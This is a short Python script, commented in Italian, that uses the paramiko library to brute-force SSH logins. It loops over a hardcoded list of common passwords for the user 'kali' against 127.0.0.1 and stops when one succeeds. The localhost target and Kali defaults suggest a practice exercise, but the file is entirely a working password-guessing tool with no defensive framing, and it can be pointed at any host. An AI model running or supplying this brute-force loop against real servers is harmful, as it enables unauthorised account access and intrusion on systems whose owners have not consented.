import paramiko
import time

# Funzione per tentare il login SSH
def tenta_login(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, port=port, username=username, password=password, timeout=2)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"[!] Errore: {e}")
        return None

# --- Configurazione ---
host = "127.0.0.1"      
port = 22                
username = "kali"     

# Lista di password direttamente nel codice
passwords = ["1234", "password", "kali", "toor", "student"]

# --- Brute-force ---
print(f"\n[*] Avvio brute-force SSH su {host} con utente '{username}'\n")
for pwd in passwords:
    print(f"[+] Provo password: {pwd}")
    risultato = tenta_login(host, port, username, pwd)

    if risultato is True:
        print(f"\n[✔] Password trovata: {pwd}")
        break
    elif risultato is False:
        print("[-] Password errata")
    else:
        print("[!] Problema di connessione, interrompo")
        break

else:
    print("\n[✘] Nessuna password trovata")
